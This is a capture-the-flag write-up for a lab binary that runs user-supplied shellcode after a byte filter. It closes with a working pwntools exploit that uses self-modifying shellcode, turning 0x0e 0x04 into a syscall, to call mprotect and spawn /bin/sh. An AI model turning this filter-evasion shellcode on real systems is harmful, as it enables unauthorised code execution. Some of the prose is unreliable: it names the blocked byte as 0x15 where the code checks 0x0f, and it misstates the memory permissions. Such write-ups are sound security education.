---
title: "Void Execution"
categories: Binary Exploitation
tags: 
draft: false
completedDuringEvent: true
submitted: true
flag: THM{REDACTED}
---
> No description.

---

Given a binary `voidexec` and `libc.so.6` file.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *s; // [rsp+8h] [rbp-8h]

  setup(argc, argv, envp);
  s = mmap((void *)0xC0DE0000LL, 0x64uLL, 7, 34, -1, 0LL);
  memset(s, 0, 0x64uLL);
  puts("\nSend to void execution: ");
  read(0, s, 0x64uLL);
  puts("\nvoided!\n");
  if ( (unsigned __int8)forbidden(s) )
    exit(1);
  mprotect(s, 0x64uLL, 4);
  ((void (*)(void))s)();
  return 0;
}
```

The binary reads shellcode from the user and executes it. The shellcode is stored in a memory region that is marked as read-only. The binary then calls `mprotect` to change the memory region to read-write and then changes the memory region to read-execute. Finally, the binary calls the shellcode.

The `forbidden` function checks if the shellcode contains the bytes `0x15` or `0xCD 0x80`. If the shellcode contains these bytes, the binary exits.

```c
__int64 __fastcall forbidden(__int64 a1)
{
  unsigned __int64 i; // [rsp+10h] [rbp-10h]

  for ( i = 0LL; i <= 0x62; ++i )
  {
    if ( *(_BYTE *)(a1 + i) == 15 || *(_BYTE *)(a1 + i) == 0xCD && *(_BYTE *)(i + 1 + a1) == 0x80 )
    {
      puts("Forbidden!");
      return 1LL;
    }
  }
  return 0LL;
}
```

The idea is to write a shellcode that does not contain the forbidden bytes and execute it. So we need to write a shellcode that does not contain the bytes `0x15` or `0xCD 0x80`.

So we can write the `syscall` or `int 0x80` instructions in a different way. We can use the `inc` instruction to increment the value of the byte at the address of the instruction before the instruction executes. This way we can avoid the forbidden bytes. But the memory region is marked as read-only. So we need to change the memory region to read-write to modify the `syscall` or `int 0x80` instructions.

Since the binary is **PIE** enabled, we need to calculate the address of the `mprotect` function. To find the **PIE** base address, we need to find which register is storing some function address from the binary. So i found that the `r13` register is storing the address of the `main` function. So we can calculate the address of the `mprotect` function by subtracting the address of the `main` function from the address of the `mprotect` function. Now we can use the `lea` instruction to load the address of the `mprotect` function to the `rbx` register.

```asm
lea rbx, [r13 - main + mprotect]
```

Now we can write the shellcode to call the `mprotect` function to change the memory region to read-write and then change the memory region to read-execute. Finally, we can write the shellcode to call the `execve` syscall.

```asm
mov rdi, 0xC0DE0000
mov rsi, 0x64
mov rdx, 0x7
call rbx
```

Voila! We can now write the shellcode to call the `execve` syscall.

```py
from pwn import *

binary = './voidexec'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = process(binary)
# r = remote('10.10.150.155', 9008)

shellcode = asm(f'''
    lea rbx, [r13 - {e.sym['main']} + {e.plt['mprotect']}]

    mov rdi, 0xC0DE0000
    mov rsi, 0x64
    mov rdx, 0x7
    call rbx

    mov rax, 0x3b
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    inc byte ptr [rip + syscall]
    inc byte ptr [rip + syscall + 1]
    
syscall:
    .byte 0x0e, 0x04
''')
log.info(f'Length of shellcode: {len(shellcode)}')

r.recvuntil(b'Send to void execution: ')
r.sendline(shellcode)
r.interactive()
```

## References

- [Shellcode Challenge 3](https://cov-comsec.github.io/posts/2021_assembly_and_shellcoding_walkthrough/#solution-shellcode-challenge-3)
